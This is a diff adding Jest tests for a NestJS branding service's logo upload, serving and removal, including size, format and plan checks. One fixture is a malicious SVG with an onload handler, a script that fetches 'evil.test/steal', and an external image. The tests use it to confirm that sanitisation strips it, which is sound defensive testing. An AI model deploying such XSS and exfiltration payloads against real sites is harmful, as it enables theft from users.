@@ -1,4 +1,4 @@
-import { ForbiddenException, NotFoundException } from '@nestjs/common';
+import { BadRequestException, ForbiddenException, NotFoundException } from '@nestjs/common';
 import { BrandFont, Plan } from '@repo/db';
 import { BrandingService } from './branding.service';
 import { MESSAGES } from '../common/messages';
@@ -26,7 +26,38 @@ function makeService(user: Partial<Row> | null) {
       update,
     },
   };
-  return { service: new BrandingService(prisma as never), prisma, update, getRow: () => row };
+
+  // In-memory storage stub keyed exactly like StorageService.
+  const objects = new Map<string, Buffer>();
+  const storage = {
+    buildBrandingLogoKey: (id: string) => `branding/${id}/logo`,
+    save: jest.fn(async (key: string, data: Buffer) => {
+      objects.set(key, data);
+    }),
+    read: jest.fn(async (key: string) => {
+      const v = objects.get(key);
+      if (!v) throw new Error('not found');
+      return v;
+    }),
+  };
+  const config = { get: jest.fn((k: string) => (k === 'API_PUBLIC_URL' ? 'https://api.example.com' : undefined)) };
+
+  const service = new BrandingService(prisma as never, storage as never, config as never);
+  return { service, prisma, update, storage, objects, getRow: () => row };
+}
+
+// A 1×1 PNG (valid magic) and a minimal valid JPEG header for upload tests.
+const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
+const SVG_OK = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>');
+const SVG_EVIL = Buffer.from(
+  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
+    '<script>fetch("//evil.test/steal")</script>' +
+    '<image href="http://evil.test/x.png"/>' +
+    '<rect width="10" height="10"/></svg>',
+);
+
+function logoFile(buffer: Buffer, originalname: string, mimetype: string) {
+  return { buffer, originalname, mimetype, size: buffer.length };
 }
 
 describe('BrandingService.get', () => {
@@ -114,5 +145,110 @@ describe('BrandingService.update', () => {
       where: { id: 'u1' },
       data: { brandColor: null },
     });
+  });
+});
+
+describe('BrandingService.uploadLogo', () => {
+  it('rejects FREE plan with the upgrade copy (403) and stores nothing', async () => {
+    const { service, storage } = makeService({ plan: Plan.FREE });
+    await expect(
+      service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png')),
+    ).rejects.toBeInstanceOf(ForbiddenException);
+    expect(storage.save).not.toHaveBeenCalled();
+  });
+
+  it('rejects a disallowed format with the branding copy (400)', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    const gif = logoFile(Buffer.from('GIF89a....'), 'logo.gif', 'image/gif');
+    await expect(service.uploadLogo('u1', gif)).rejects.toBeInstanceOf(BadRequestException);
+    await expect(service.uploadLogo('u1', gif)).rejects.toMatchObject({
+      message: MESSAGES.branding.logoFormat,
+    });
+  });
+
+  it('rejects a mime/extension/content mismatch (script renamed .png)', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    const fake = logoFile(Buffer.from('<script>alert(1)</script>'), 'logo.png', 'image/png');
+    await expect(service.uploadLogo('u1', fake)).rejects.toMatchObject({
+      message: MESSAGES.branding.logoFormat,
+    });
+  });
+
+  it('rejects an oversize file with the size copy (400)', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    const big = { ...logoFile(PNG_BYTES, 'logo.png', 'image/png'), size: 3 * 1024 * 1024 };
+    await expect(service.uploadLogo('u1', big)).rejects.toMatchObject({
+      message: MESSAGES.branding.logoTooLarge,
+    });
+  });
+
+  it('rejects an empty file with the empty copy (400)', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    const empty = logoFile(Buffer.alloc(0), 'logo.png', 'image/png');
+    await expect(service.uploadLogo('u1', empty)).rejects.toMatchObject({
+      message: MESSAGES.branding.logoEmpty,
+    });
+  });
+
+  it('stores a valid PNG and points brandLogoUrl at the public URL', async () => {
+    const { service, storage, getRow } = makeService({ plan: Plan.PRO });
+    const view = await service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png'));
+    expect(storage.save).toHaveBeenCalledWith('branding/u1/logo', PNG_BYTES);
+    expect(getRow()?.brandLogoUrl).toMatch(
+      /^https:\/\/api\.example\.com\/api\/branding\/u1\/logo\?v=[0-9a-f]{12}$/,
+    );
+    expect(view.logoUrl).toBe(getRow()?.brandLogoUrl);
+  });
+
+  it('SECURITY: sanitizes a malicious SVG before storing it', async () => {
+    const { service, objects } = makeService({ plan: Plan.PRO });
+    await service.uploadLogo('u1', logoFile(SVG_EVIL, 'logo.svg', 'image/svg+xml'));
+    const stored = objects.get('branding/u1/logo')!.toString('utf8');
+    expect(stored).not.toMatch(/<script/i);
+    expect(stored).not.toMatch(/onload/i);
+    expect(stored).not.toMatch(/evil\.test/i);
+    // The benign drawing survives.
+    expect(stored).toMatch(/<rect/i);
+  });
+
+  it('stores a clean SVG and serves it with the svg content-type', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    await service.uploadLogo('u1', logoFile(SVG_OK, 'logo.svg', 'image/svg+xml'));
+    const served = await service.serveLogo('u1');
+    expect(served.contentType).toBe('image/svg+xml');
+    expect(served.isSvg).toBe(true);
+  });
+});
+
+describe('BrandingService.serveLogo', () => {
+  it('serves a stored PNG with the correct content-type (public, no gate)', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    await service.uploadLogo('u1', logoFile(PNG_BYTES, 'logo.png', 'image/png'));
+    const served = await service.serveLogo('u1');
+    expect(served.contentType).toBe('image/png');
+    expect(served.isSvg).toBe(false);
+    expect(served.buffer).toEqual(PNG_BYTES);
+  });
+
+  it('throws NotFound when no logo is stored', async () => {
+    const { service } = makeService({ plan: Plan.PRO });
+    await expect(service.serveLogo('ghost')).rejects.toBeInstanceOf(NotFoundException);
+  });
+});
+
+describe('BrandingService.removeLogo', () => {
+  it('rejects FREE plan (403)', async () => {
+    const { service } = makeService({ plan: Plan.FREE, brandLogoUrl: 'x' });
+    await expect(service.removeLogo('u1')).rejects.toBeInstanceOf(ForbiddenException);
+  });
+
+  it('clears brandLogoUrl for an eligible sender', async () => {
+    const { service, update, getRow } = makeService({
+      plan: Plan.PRO,
+      brandLogoUrl: 'https://api.example.com/api/branding/u1/logo?v=abc',
+    });
+    await service.removeLogo('u1');
+    expect(update).toHaveBeenCalledWith({ where: { id: 'u1' }, data: { brandLogoUrl: null } });
+    expect(getRow()?.brandLogoUrl).toBeNull();
   });
 });
